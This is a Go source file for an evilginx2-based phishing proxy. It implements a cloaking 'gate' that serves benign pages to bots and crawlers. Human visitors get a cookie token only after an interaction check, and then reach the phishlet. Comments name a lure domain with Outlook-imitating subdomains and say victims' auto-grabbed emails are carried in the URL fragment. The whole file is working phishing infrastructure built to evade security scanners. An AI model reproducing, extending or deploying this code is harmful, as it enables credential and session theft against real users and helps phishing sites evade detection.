package core

import (
	"bytes"
	"embed"
	"html/template"
	"io"
	"net/http"
	"strconv"
	"strings"

	"github.com/kgretzky/evilginx2/log"
)

// gate page assets (embedded)
//go:embed gate_templates/*.html
var gateTemplates embed.FS

// GateCheck is called from the proxy for every request to a phish host.
// It returns nil when the request should proceed to the phishlet,
// or a blocking response when the visitor must be gated/verified.
//
// Flow:
//   1. Bot detection already ran (IsCrawlerWithIP) — bots get benign pages.
//   2. If visitor holds a valid human token cookie -> pass.
//   3. If visitor submits a valid gate nonce -> grant token, redirect to original URL.
//   4. Otherwise -> serve the gate interstitial with a fresh nonce.
func (c *cloakState) GateCheck(ip string, r *http.Request) *http.Response {
	if !c.config.Enabled {
		return nil
	}

	// already verified?
	if ck, err := r.Cookie(humanCookieName); err == nil {
		if c.humanValid(ip, ck.Value) {
			log.Debug("[gate] %s %s %s -> PASS (valid token)", ip, r.Method, r.URL.Path)
			return nil
		}
		log.Debug("[gate] %s %s %s -> stale/invalid token, re-gating", ip, r.Method, r.URL.Path)
	} else {
		log.Debug("[gate] %s %s %s -> no token cookie, checking endpoints", ip, r.Method, r.URL.Path)
	}

	// gate endpoints
	switch r.URL.Path {
	case "/__gate/verify":
		return c.gateVerify(ip, r)
	case "/__gate/status":
		return c.gateStatus(ip, r)
	}

	// issue nonce and render interstitial
	nonce := c.gateNonceIssue(ip)
	log.Debug("[gate] %s %s %s -> challenge issued (nonce %.8s...)", ip, r.Method, r.URL.Path, nonce)
	return c.renderGatePage(r, nonce)
}

// gateVerify handles POST /__gate/verify with a trusted-interaction proof.
func (c *cloakState) gateVerify(ip string, r *http.Request) *http.Response {
	r.ParseForm()
	nonce := r.Form.Get("n")
	proof := r.Form.Get("p") // "1" = isTrusted user event fired
	redirectTo := r.Form.Get("o")
	if redirectTo == "" || !strings.HasPrefix(redirectTo, "/") {
		redirectTo = "/" // only allow same-origin relative paths
	}

	if proof != "1" {
		log.Debug("[gate] %s verify DENIED: no trusted event proof (p=%q)", ip, proof)
		return c.renderGatePage(r, c.gateNonceIssue(ip))
	}
	if !c.gateNonceVerify(ip, nonce) {
		log.Debug("[gate] %s verify DENIED: bad/expired nonce %.8s...", ip, nonce)
		return c.renderGatePage(r, c.gateNonceIssue(ip))
	}

	tok := c.humanGrant(ip)
	log.Info("[gate] %s HUMAN VERIFIED -> token %.8s... redirect to %s", ip, tok, redirectTo)

	// tiny page that sets cookie and bounces back to the original path.
		// The verify POST was made to "/__gate/verify" + location.hash, so this
		// response page still carries the original fragment client-side —
		// re-attach it to the redirect target (auto-grab emails ride in #fragment).
		// Cookie domain: set on base domain (e.g., .onlinefiletransfer.xyz) so all
		// phishlet subdomains (loq., www., outlook., etc.) share the human token.
		host := r.Host
		if i := strings.Index(host, ":"); i != -1 {
			host = host[:i]
		}
		parts := strings.Split(host, ".")
		var cookieDomain string
		if len(parts) >= 2 {
			// Use the registrable domain (last two labels for typical TLDs)
			cookieDomain = "Domain=." + parts[len(parts)-2] + "." + parts[len(parts)-1] + "; "
		}
		oJS := strconv.Quote(redirectTo)
		body := `<!doctype html><html><head><meta charset="utf-8"><title>Redirecting</title></head><body>
	<script>
	document.cookie="` + humanCookieName + `=` + tok + `; path=/; max-age=86400; SameSite=Lax; ` + cookieDomain + `";
	var o = ` + oJS + `;
	if (location.hash && location.hash.length > 1 && o.indexOf("#") === -1) { o += location.hash; }
	location.replace(o);
	</script></body></html>`

	w := &responseRecorder{statusCode: http.StatusOK}
	w.header = http.Header{}
	w.header.Set("Content-Type", "text/html; charset=utf-8")
	w.body = bytes.NewBufferString(body)
	// also set cookie server-side for non-JS fallback
	w.header.Add("Set-Cookie", humanCookieName+"="+tok+"; Path=/; Max-Age=86400; SameSite=Lax; "+cookieDomain)
	return &http.Response{
		StatusCode:  w.statusCode,
		Header:      w.header,
		Body:        io.NopCloser(w.body),
		ContentLength: int64(w.body.Len()), // REQUIRED: goproxy writes 0 body bytes without it
		Request:     r,
	}
}

// gateStatus handles GET /__gate/status — used by the gate page JS to poll
// whether a trusted interaction was registered (beacon-driven alternative).
func (c *cloakState) gateStatus(ip string, r *http.Request) *http.Response {
	c.mu.RLock()
	prof, ok := c.profiles[ip]
	c.mu.RUnlock()
	sawInteraction := ok && prof.HasInteraction
	body := `{"ok":` + boolJSON(sawInteraction) + `}`
	w := &responseRecorder{statusCode: http.StatusOK}
	w.header = http.Header{}
	w.header.Set("Content-Type", "application/json")
	w.body = bytes.NewBufferString(body)
	return &http.Response{
		StatusCode:  w.statusCode,
		Header:      w.header,
		Body:        io.NopCloser(w.body),
		ContentLength: int64(w.body.Len()), // REQUIRED: goproxy writes 0 body bytes without it
		Request:     r,
	}
}

// renderGatePage serves the interstitial that requires real user interaction.
func (c *cloakState) renderGatePage(r *http.Request, nonce string) *http.Response {
	redirectTo := r.URL.Path
	// When re-rendering after a failed verify POST, the request path IS the
	// gate endpoint — redirecting back there would loop. Use the submitted
	// 'o' field (original URL) instead.
	if gateHandles(redirectTo) {
	 redirectTo = r.Form.Get("o")
	 if redirectTo == "" || !strings.HasPrefix(redirectTo, "/") {
	 	redirectTo = "/"
	 }
	}
	if r.URL.RawQuery != "" {
		redirectTo += "?" + r.URL.RawQuery
	}
	// fragments never reach the server — the gate JS re-reads location.hash
	// client-side and re-attaches it after verification.

	tmplData := struct {
		Nonce   string
		OrigURL string
	}{nonce, redirectTo}

	t, err := template.ParseFS(gateTemplates, "gate_templates/gate.html")
	if err != nil {
		log.Error("[gate] template error: %v", err)
		// fall back to plain benign response
		return c.ServeBenignResponse(r)
	}
	var buf bytes.Buffer
	if err := t.Execute(&buf, tmplData); err != nil {
		log.Error("[gate] template exec error: %v", err)
		return c.ServeBenignResponse(r)
	}

	w := &responseRecorder{statusCode: http.StatusOK}
	w.header = http.Header{}
	w.header.Set("Content-Type", "text/html; charset=utf-8")
	w.header.Set("Cache-Control", "no-store")
	w.body = &buf
	return &http.Response{
		StatusCode:   w.statusCode,
		Header:       w.header,
		Body:         io.NopCloser(w.body),
		ContentLength: int64(w.body.Len()), // REQUIRED: goproxy writes 0 body bytes without it
		Request:      r,
	}
}

func boolJSON(b bool) string {
	if b {
		return "true"
	}
	return "false"
}

// shouldGate decides whether a request path requires human verification.
// Gate endpoints themselves are handled inside GateCheck (they must always
// reach it), so exclude them here to avoid double-routing.
// Static assets (favicon, CSS, JS, images, fonts) are excluded — they
// should not trigger gate challenges or consume nonces.
func shouldGate(path string) bool {
	if strings.HasPrefix(path, "/__gate/") {
		return false
	}
	// exclude common static asset extensions
	lower := strings.ToLower(path)
	for _, ext := range []string{".ico", ".css", ".js", ".map", ".png", ".jpg", ".jpeg", ".gif", ".webp", ".svg", ".woff", ".woff2", ".ttf", ".eot", ".otf", ".pdf", ".zip", ".gz", ".json", ".xml", ".txt", ".wasm"} {
		if strings.HasSuffix(lower, ext) {
			return false
		}
	}
	// also exclude favicon.ico explicitly (no extension check needed for root-level)
	if lower == "/favicon.ico" {
		return false
	}
	// everything else that looks like a page navigation gets gated
	return true
}

// gateHandles reports whether the path is a gate endpoint that must be
// routed through GateCheck unconditionally (before phishlet handling).
func gateHandles(path string) bool {
	return path == "/__gate/verify" || path == "/__gate/status"
}
